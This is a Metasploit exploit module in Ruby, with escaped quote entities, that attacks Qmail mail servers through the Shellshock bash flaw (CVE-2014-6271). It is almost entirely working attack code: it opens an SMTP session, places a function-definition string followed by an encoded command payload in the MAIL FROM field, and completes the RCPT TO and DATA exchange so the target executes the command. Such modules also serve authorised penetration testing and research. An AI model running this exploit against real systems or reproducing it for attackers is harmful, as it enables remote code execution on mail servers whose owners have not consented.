# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Smtp

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Qmail SMTP Bash Environment Variable Injection (Shellshock)&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a shellshock vulnerability on Qmail, a public
        domain MTA written in C that runs on Unix systems.
        Due to the lack of validation on the MAIL FROM field, it is possible to
        execute shell code on a system with a vulnerable BASH (Shellshock).
        This flaw works on the latest Qmail versions (qmail-1.03 and
        netqmail-1.06).
        However, in order to execute code, /bin/sh has to be linked to bash
        (usually default configuration) and a valid recipient must be set on the
        RCPT TO field (usually admin@exampledomain.com).
        The exploit does not work on the "qmailrocks" community version
        as it ensures the MAILFROM field is well-formed.
      },
      &#039;Author&#039;         =>
        [
          &#039;Mario Ledo (Metasploit module)&#039;,
          &#039;Gabriel Follon (Metasploit module)&#039;,
          &#039;Kyle George (Vulnerability discovery)&#039;
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => [&#039;unix&#039;],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2014-6271&#039;],
          [&#039;CWE&#039;, &#039;94&#039;],
          [&#039;OSVDB&#039;, &#039;112004&#039;],
          [&#039;EDB&#039;, &#039;34765&#039;],
          [&#039;URL&#039;, &#039;http://seclists.org/oss-sec/2014/q3/649&#039;],
          [&#039;URL&#039;, &#039;https://lists.gt.net/qmail/users/138578&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x3e",
          &#039;Space&#039;       => 888,
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;generic telnet perl ruby python&#039;
              # telnet ruby python and perl works only if installed on target
            }
        },
      &#039;Targets&#039;        => [ [ &#039;Automatic&#039;, { }] ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Sep 24 2014&#039;
    ))

    deregister_options(&#039;MAILFROM&#039;)
  end

  def smtp_send(data = nil)
    begin
      result = &#039;&#039;
      code = 0
      sock.put("#{data}")
      result = sock.get_once
      result.chomp! if (result)
      code = result[0..2].to_i if result
      return result, code
    rescue Rex::ConnectionError, Errno::ECONNRESET, ::EOFError
      return result, 0
    rescue ::Exception => e
      print_error("#{rhost}:#{rport} Error smtp_send: &#039;#{e.class}&#039; &#039;#{e}&#039;")
      return nil, 0
    end
  end

  def exploit
    to = datastore[&#039;MAILTO&#039;]
    connect
    result = smtp_send("HELO localhost\r\n")
    if result[1] < 200 || result[1] > 300
      fail_with(Failure::Unknown, (result[1] != 0 ? result[0] : &#039;connection error&#039;))
    end
    print_status(&#039;Sending the payload...&#039;)
    result = smtp_send("mail from:<() { :; }; " + payload.encoded.gsub!(/\\/, &#039;\\\\\\\\&#039;) + ">\r\n")
    if result[1] < 200 || result[1] > 300
      fail_with(Failure::Unknown, (result[1] != 0 ? result[0] : &#039;connection error&#039;))
    end
    print_status("Sending RCPT TO #{to}")
    result = smtp_send("rcpt to:<#{to}>\r\n")
    if result[1] < 200 || result[1] > 300
      fail_with(Failure::Unknown, (result[1] != 0 ? result[0] : &#039;connection error&#039;))
    end
    result = smtp_send("data\r\n")
    if result[1] < 200 || result[1] > 354
      fail_with(Failure::Unknown, (result[1] != 0 ? result[0] : &#039;connection error&#039;))
    end
    result = smtp_send("data\r\n\r\nfoo\r\n\r\n.\r\n")
    if result[1] < 200 || result[1] > 300
      fail_with(Failure::Unknown, (result[1] != 0 ? result[0] : &#039;connection error&#039;))
    end
    disconnect
  end
end

